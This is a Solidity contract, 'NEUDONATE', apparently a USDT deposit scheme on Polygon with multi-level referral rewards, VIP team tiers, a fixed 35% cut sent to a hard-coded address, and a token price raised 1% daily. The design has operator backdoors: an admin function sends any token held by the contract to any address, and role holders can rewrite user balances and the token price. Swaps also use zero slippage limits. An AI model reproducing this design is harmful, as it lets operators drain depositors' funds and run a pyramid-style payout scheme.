// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

interface Token{
    function transferFrom(address,address,uint) external;
    function transfer(address,uint) external;
    function approve(address,uint) external;
    function balanceOf(address) external view returns(uint);
    function mint(address dst,uint256 wad)external;
}
interface FarmLike{
    function harvestForOther(address usr) external;
    function deposit(address,uint) external;
    function beharvest(address usr) external view returns (uint256);
}
interface IUniswapV2Router{
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
contract NEUDONATE  {

    mapping (address => uint) public wards;
    function rely(address usr) external  auth { wards[usr] = 1; }
    function deny(address usr) external  auth { wards[usr] = 0; }
    modifier auth {
        require(wards[msg.sender] == 1, "NEUDONATE/not-authorized");
        _;
    }
    uint256                                           public  max = 5000*1E18;
    uint256                                           public  rate = 200;
    uint256                                           public  scale = 200;
    uint256                                           public  compound = 5;
    uint256[]                                         public  ratio = [1200000,800000,500000,1200000,800000,500000];
    uint256[]                                         public  recommendRate = [20,10];
    uint256[]                                         public  teamAmount = [200,500,1500,3000,7000];
    uint256[]                                         public  teamScale = [800000,1000000,1500000,2000000,2500000,3000000];
    uint256                                           public  lastTime = 1692460800;
    uint256                                           public  unlockTime = 1692460800;
    uint256                                           public  base = 1E16;
    bool                                              public  pool;
    bool                                              public  canMint = true;
    bool                                              public  withETH;
    bool                                              public  live =true;
    uint256                                           public  tier = 50;
    uint256                                           public  totalDeposit;
    uint256                                           public  totalWith;
    uint256                                           public  totalEth;
    uint256                                           public  totalMint;
    uint256                                           public  lastId;
    address                                           public  fountaddress = 0x360cf4A2cE04AafeD14E7d3aF320673AD59B3dc8;
    address                                           public  exchequer = 0x502121753D9acAeF68a4FcB97A6c7beC123bE6D2;
    address                                           public  NEU = 0x79A0842743c7a37a2914D42294FCdF68f33a742c;
    address                                           public  usdt = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    address                                           private uniswapV2Router = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
    address                                           public  ETH = 0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619;
    address                                           public  neufoundFarm = 0xE85131c9530A2Fc55D3587F914Ba6c1415f7EF86;
    address                                           public  usdtFarm = 0xBC2A75F87429ae2beB7fde71D6edcFB64353325c;
    mapping (address => UserInfo)                     public  userInfo;
    mapping (address => bool)                         public  special;
    mapping (address => bool)                         public  role;
    mapping (uint256 => uint256)                      public  dayDeposit;
    mapping (uint256 => uint256)                      public  dayWith;
    mapping (address => mapping(uint256 => uint256))  public  userDayTotal;
    address[]                                         public  depositUsers;

    struct UserInfo { 
        address    recommend;
        address[]  under;
        bool       white;
        uint256    amount;
        uint256[3]    team;
        uint256    hasten;
        uint256    releaseAmount;
        uint256    released;
        uint256[2] reward;
        uint256    releasFinish;
        uint256    lastTime;
        uint256    ethAmount;
        uint256    vip;
        uint256[4][]  depositList;
        uint256[2][]  withdrawList;
        uint256[3][]  ethList;
        uint256[3][]  neuList;
        RecommendInfo[]  recommendList;
    }
    struct RecommendInfo { 
        address    recommend;
        uint256    amount;
        uint256    what;
        uint256    time;
    }
    event Withdraw( address  indexed  owner,
                    uint256           wad
                 );
    constructor() {
        wards[msg.sender] = 1;
        init();
    }
    function global(uint256 what, uint data,address usr) external auth {
        if (what == 1) max = data;                           
        else if (what == 2) rate = data; 
        else if (what == 3) lastTime = data; 
        else if (what == 4) unlockTime = data;  
        else if (what == 5) pool = !pool;                     
        else if (what == 6) fountaddress = usr; 
        else if (what == 7) exchequer = usr;   
        else if (what == 8) NEU = usr; 
        else if (what == 9) ETH = usr; 
        else if (what == 10) scale = data; 
        else if (what == 11) neufoundFarm = usr; 
        else if (what == 12) compound = data;
        else if (what == 13) usdtFarm = usr;
        else if (what == 14) tier = data;
        else if (what == 15) userInfo[usr].white = !userInfo[usr].white;
        else if (what == 16) userInfo[usr].amount = data;
        else if (what == 17) userInfo[usr].team[0] = data;   
        else if (what == 18) special[usr] = !special[usr];
        else if (what == 19) base = data;   
        else if (what == 20) role[usr] = !role[usr]; 
        else if (what == 21) canMint = !canMint; 
        else if (what == 22) withETH = !withETH;
        else if (what == 23) live = !live;       
        else revert("NEUDONATE/setdata-unrecognized-param");
    }
    function setArry(uint what, uint[] memory data) external auth {                          
        if (what == 1) ratio = data;   
        else if (what == 2) recommendRate = data;  
        else if (what == 3) teamAmount = data;
        else if (what == 4) teamScale = data;                                     
        else revert("NEUDONATE/11");
    }
    function setUser(uint256 what, uint data,address usr) external{  
        require(role[msg.sender],"NEUDONATE/12");                        
        if (what == 1) userInfo[usr].white = !userInfo[usr].white;
        else if (what == 2) userInfo[usr].amount = data;
        else if (what == 3) userInfo[usr].team[0] = data;   
        else if (what == 4) special[usr] = !special[usr];                                    
        else revert("NEUDONATE/13");
    }
    function setVip(uint256 vip,address usr) external{  
        require(role[msg.sender],"NEUDONATE/12");                        
        userInfo[usr].team[0] = teamAmount[vip-1]*1E18;   
    }
    function setNeuPrice(uint256 price) external{  
        require(role[msg.sender],"NEUDONATE/12");                        
        base = price;   
    }
    function setRecommend(address usr,address recommender) external auth {
        userInfo[usr].recommend = recommender;
        userInfo[recommender].under.push(usr);
    }
    function deposit(uint256 wad,address recommender) public {
        require(live,"NEUDONATE/13");
        billing(msg.sender);
        UserInfo storage user = userInfo[msg.sender];
        require(user.amount + wad <= max,"NEUDONATE/2");
        if(user.recommend == address(0) && userInfo[recommender].recommend != address(0)){
           user.recommend = recommender;
           userInfo[recommender].under.push(msg.sender);
        }
        if(block.timestamp >= lastTime + 86400){
           totalWith +=dayWith[lastTime];
           lastTime += 86400;
           base = base*101/100;
        }
        dayDeposit[lastTime] +=wad;
        totalDeposit +=wad;
        uint totalneu = totalDeposit*compound/100*1E18/neuPrice();
        if(totalneu>totalMint && canMint) {
            uint neuAmount = totalneu-totalMint;
            Token(NEU).mint(exchequer,neuAmount);
            totalMint += neuAmount;
        }
        FarmLike(neufoundFarm).deposit(msg.sender,wad);
        Token(usdt).transferFrom(msg.sender, address(this), wad);
        Token(usdt).transfer(fountaddress, wad*35/100);
        uint ethAmount = swapUsdtForETH(wad*6/10);
        uint lockEth = ethAmount*1/6;
        totalEth += lockEth;
        user.ethAmount += lockEth;
        Token(ETH).transfer(msg.sender,ethAmount*5/6);
        address upAddress = user.recommend;
        for(uint i=0;i<tier;++i) {
            if(upAddress == address(0)) break;
            UserInfo storage up = userInfo[upAddress];
            if(i<2 && up.released < getTotalRelease(upAddress)){
                uint _wad;
                if(up.amount >= user.amount + wad) _wad = wad;
                else if(up.amount > user.amount) _wad = up.amount - user.amount;
                if(_wad >0) {
                    uint _amount = _wad*recommendRate[i]/100;
                    uint length = up.depositList.length;
                    up.depositList[length-1][3] += _amount;
                    up.releaseAmount += _amount;
                    RecommendInfo memory list;
                    list.recommend = msg.sender;
                    list.amount = _amount;
                    list.what = i+1;
                    list.time = block.timestamp;
                    up.recommendList.push(list);
                }
            }
            userDayTotal[upAddress][lastTime] +=wad;
            up.team[0] +=wad;
            up.team[1] +=1;
            up.team[2] +=lockEth;
            upAddress = up.recommend;
        }
        user.amount += wad;
        uint[4] memory order = [wad,block.timestamp,0,0];
        user.depositList.push(order);
        depositUsers.push(msg.sender);
    } 
    function teamStatic(address usr,uint wad) internal{
        address upAddress = userInfo[usr].recommend;
        for(uint i=0;i<6;++i) {
           if(upAddress == address(0)) return;
           UserInfo storage up = userInfo[upAddress];
           uint length = up.under.length;
           uint totalRele = getTotalRelease(upAddress);
           if((length > i || up.white) && up.released < totalRele) {
               uint256 amount = wad*ratio[i]/10000000;
               reward(upAddress,amount);
               up.reward[0] += amount;
               RecommendInfo memory list;
                    list.recommend = usr;
                    list.amount = amount;
                    list.what = 3;
                    list.time = block.timestamp;
               up.recommendList.push(list);
           }
           upAddress = up.recommend;
        }
    }
    function teamFeward(address usr,uint wad) internal{
        address upAddress = userInfo[usr].recommend;
        uint levelForLower = 0;
        uint lastRate = 0;
        bool lateral = false;
        while(upAddress != address(0)){
            UserInfo storage up = userInfo[upAddress];
            uint upvip = getvip(upAddress);
            uint totalRele = getTotalRelease(upAddress);
            if(upvip > levelForLower && up.released < totalRele){
                uint upRate = teamScale[upvip];
                uint _rate = upRate;
                if(special[upAddress] && !lateral) {
                    _rate += teamScale[0];
                    lateral = true;
                }
                uint256 amount = wad*_rate/10000000;
                reward(upAddress,amount);
                up.reward[1] += amount;
                RecommendInfo memory list;
                    list.recommend = usr;
                    list.amount = amount;
                    list.what = 4;
                    list.time = block.timestamp;
                up.recommendList.push(list);
                levelForLower = upvip;
                lastRate = upRate;
            }
            upAddress = up.recommend;
        }
    }
    function reward(address usr,uint amount) internal{
        UserInfo storage up = userInfo[usr];
        uint totalRele = getTotalRelease(usr);
        if(up.released + amount > totalRele) amount = totalRele - up.released;
        up.released += amount;
        uint256 j = up.hasten;
        up.depositList[j][2] += amount;
        uint256 reled = up.depositList[j][2];
        uint256 _amount = up.depositList[j][0];
        uint256 totalRe = _amount*scale/100 + up.depositList[j][3];
        if(reled > totalRe) {
            up.depositList[j][2] = totalRe;
            if(j<up.depositList.length-1){
                up.hasten +=1;
                up.depositList[j+1][2] += (reled - totalRe);
            }
        }
    }
    function getvip(address usr) public view returns(uint vip){
        UserInfo storage user = userInfo[usr];
        if(user.team[0] >= teamAmount[4]*1E18) vip = 5;
        else if(user.team[0] >= teamAmount[3]*1E18) vip = 4;
        else if(user.team[0] >= teamAmount[2]*1E18) vip = 3;
        else if(user.team[0] >= teamAmount[1]*1E18) vip = 2;
        else if(user.team[0] >= teamAmount[0]*1E18) vip = 1;
        else vip =0;
    }
    function neuPrice() public view returns(uint price){
        if(pool) {
            address[] memory path = new address[](2);
            path[0] = NEU;
            path[1] = usdt;
            uint[] memory amounts = IUniswapV2Router(uniswapV2Router).getAmountsOut(1E18,path);
            price = amounts[1];
        } else price = base;
    }
    function init() public {
        Token(usdt).approve(uniswapV2Router, ~uint256(0));
        Token(ETH).approve(uniswapV2Router, ~uint256(0));
    }
    function swapUsdtForETH(uint256 usdtAmount) internal returns(uint ethAmount) {
        address[] memory path = new address[](2);
        path[0] = usdt;
        path[1] = ETH;
        uint ethFrontAmount = Token(ETH).balanceOf(address(this));
        IUniswapV2Router(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdtAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        uint ethAfterAmount = Token(ETH).balanceOf(address(this));
        ethAmount = ethAfterAmount - ethFrontAmount;
    }
    function swapETHForUsdt(uint256 ethAmount) public returns(uint usdtAmount) {
        UserInfo storage user = userInfo[msg.sender];
        address[] memory path = new address[](2);
        path[0] = ETH;
        path[1] = usdt;
        Token(ETH).transferFrom(msg.sender, address(this), ethAmount);
        uint usdtFrontAmount = Token(usdt).balanceOf(address(this));
        IUniswapV2Router(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ethAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
        uint usdtAfterAmount = Token(usdt).balanceOf(address(this));
        usdtAmount = usdtAfterAmount - usdtFrontAmount;
        Token(usdt).transfer(msg.sender,usdtAmount*98/100);
        Token(usdt).transfer(fountaddress,usdtAmount*2/100);
        uint256[3] memory list = [ethAmount,usdtAmount,block.timestamp];
        user.ethList.push(list);
    }
    function swapUsdtForEth(uint256 usdtAmount,address usr) internal{
        address[] memory path = new address[](2);
        path[0] = usdt;
        path[1] = ETH;
        IUniswapV2Router(uniswapV2Router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            usdtAmount,
            0, 
            path,
            usr,
            block.timestamp
        );
    }
    function swapNeuForUsdt(uint256 neuAmount) public returns(uint usdtAmount) {
        UserInfo storage user = userInfo[msg.sender];
        Token(NEU).transferFrom(msg.sender, address(0), neuAmount);
        usdtAmount = neuAmount*neuPrice()/1E18;
        Token(usdt).transfer(msg.sender,usdtAmount*95/100);
        Token(usdt).transfer(fountaddress,usdtAmount*5/100);
        uint256[3] memory list = [neuAmount,usdtAmount,block.timestamp];
        user.neuList.push(list);
    }
    function bulkBilling(uint people,uint time) public {
        uint i;
        for(i=lastId;i<lastId+people;++i){
            address usr = depositUsers[i];
            UserInfo storage user = userInfo[usr];
            if(user.lastTime < block.timestamp - time && user.released < getTotalRelease(usr)) billing(usr);
            if(i == depositUsers.length - 1) {
                lastId = 0;
                return;
            }
        }
        lastId =i+1;
    }
    function withdrawForSelf() public {
        UserInfo storage user = userInfo[msg.sender];
        billing(msg.sender);
        uint256 wad = user.released - user.releasFinish;
        if(wad >0){
            user.releasFinish += wad;
            uint neuAmount = wad*5/100*1E18/neuPrice();
            Token(NEU).transferFrom(msg.sender, address(0), neuAmount);
            if(!withETH) Token(usdt).transfer(msg.sender,wad);
            else swapUsdtForEth(wad,msg.sender);
            dayWith[lastTime] += wad;
            uint256[2] memory list = [wad,block.timestamp];
            user.withdrawList.push(list);
        }
        emit Withdraw(msg.sender,wad); 
    }
    function billing(address usr) public{
        UserInfo storage user = userInfo[usr];
        uint totalRele = getTotalRelease(usr);
        if(user.released >= totalRele) {
            user.lastTime = block.timestamp;
            return;
        }
        (uint wad,uint[] memory reles,bool isHasten) =  getUnlock(usr);
        if(isHasten) user.hasten +=1;
        uint length = reles.length;
        user.lastTime = block.timestamp;
        if(wad > 0) { 
            for(uint i=0;i<length;++i){
                user.depositList[i][2] +=reles[i];
            }
            if(user.released + wad > totalRele) wad = totalRele - user.released;
            user.released += wad;
            teamStatic(usr,wad);
            teamFeward(usr,wad);
        }
    }
    function withdrawForNeu() public  {
        FarmLike(neufoundFarm).harvestForOther(msg.sender);
        FarmLike(usdtFarm).harvestForOther(msg.sender);
    }
    function withdrawForEth() public{
        UserInfo storage user = userInfo[msg.sender];
        uint wad =  getEthPrice(msg.sender);
        require(user.releasFinish < user.amount/2,"NEUDONATE/4");
        require(block.timestamp > unlockTime,"NEUDONATE/5");
        require(wad + user.releasFinish >=user.amount/2,"NEUDONATE/51");
        Token(ETH).transfer(msg.sender,user.ethAmount);
        user.released = getTotalRelease(msg.sender);
        user.releasFinish = user.released;
    }
    function getEthPrice(address usr) public view returns(uint){
        UserInfo storage user = userInfo[usr];
        return getEthPriceForUsdt(user.ethAmount);
    }
    function getEthPriceForUsdt(uint ethAmount) public view returns(uint){
        address[] memory path = new address[](2);
        path[0] = ETH;
        path[1] = usdt;
        uint[] memory amounts = IUniswapV2Router(uniswapV2Router).getAmountsOut(ethAmount,path);
        return amounts[1];
    }
    function getTotalPrice(address usr) public view returns(uint256 totalPrice){
        UserInfo storage user = userInfo[usr];
        totalPrice = getEthPrice(usr) + getTotalRelease(usr)-user.releasFinish + getneuAmount(usr)*neuPrice()/1E18;
    }
    function getneuAmount(address usr) public view returns(uint256 neuAmount){
        neuAmount = Token(NEU).balanceOf(usr) + FarmLike(neufoundFarm).beharvest(usr) + FarmLike(usdtFarm).beharvest(usr);
    }
    function getTotalRelease(address usr) public view returns(uint256 totalRelease){
        UserInfo storage user = userInfo[usr];
        totalRelease = user.amount*scale/100 + user.releaseAmount;
    }
    function getBeRelease(address usr) public view returns(uint256 beRelease){
        UserInfo storage user = userInfo[usr];
        (uint canRelease,,)=getUnlock(usr);
        beRelease = canRelease + user.released - user.releasFinish;
    }
    function getUnlock(address usr) public view returns(uint256 canRelease,uint[] memory reles,bool isHasten){
        UserInfo storage user = userInfo[usr];
        if(user.released < getTotalRelease(usr)){
           uint length = user.depositList.length;
           uint256 time = block.timestamp - user.lastTime;
           reles = new uint[](length);
           for(uint i = 0;i<length;++i){
               if(i>=user.hasten){
                    uint256 released = user.depositList[i][2];
                    uint256 amount = user.depositList[i][0];            
                    uint256 release = (amount*rate/100000)*time/86400;
                    uint256 totalRelease = amount*scale/100 + user.depositList[i][3];
                    if(released + release > totalRelease) {
                        release = totalRelease - released;
                        if(i<length-1) isHasten = true;
                    }
                    reles[i] = release;
                    canRelease += release;
               } 
            }
        }
    }

    function getUserInfo(address usr) public view returns(UserInfo memory user){
        user = userInfo[usr];
        user.vip = getvip(usr);
    }
   function getUsers() public view returns(address[] memory _users,uint length){
        _users = depositUsers;
        length = depositUsers.length;
    }
    function getUsersForBatch(uint start,uint people) public view returns(UserInfo[] memory user){
        user = new UserInfo[](people);
        for(uint i =0;i<people;i++){
           address usr = depositUsers[start-i];
           user[i] = getUserInfo(usr);
           if(start - i ==0) break;
        }

    }
    function getUnderInfo(address usr) public view returns(UserInfo[] memory users,uint people,uint amounts,uint ethAmounts){
        UserInfo storage user = userInfo[usr];
        uint length = user.under.length;
        people = length;
        users = new UserInfo[](length);
        for(uint i=0;i<length;++i) {
            address under = user.under[i];
            users[i] = getUserInfo(under);
            amounts += userInfo[under].amount;
            ethAmounts += userInfo[under].ethAmount;
        }
    }
    function getDeposit(uint startTime,uint endTime) public view returns (uint amount) {
       for(uint i=startTime;i<=endTime;i+=86400){
           amount +=dayDeposit[i];
       }
    }
    function getWithdraw(uint startTime,uint endTime) public view returns (uint amount) {
       for(uint i=startTime;i<=endTime;i+=86400){
           amount +=dayWith[i];
       }
    }
    function getWithdrawTotal() public view returns (uint amount) {
           amount = totalWith + dayWith[lastTime];
       }
    function withdraw(address asses, uint256 amount, address ust) public auth {
        Token(asses).transfer(ust, amount);
    }
}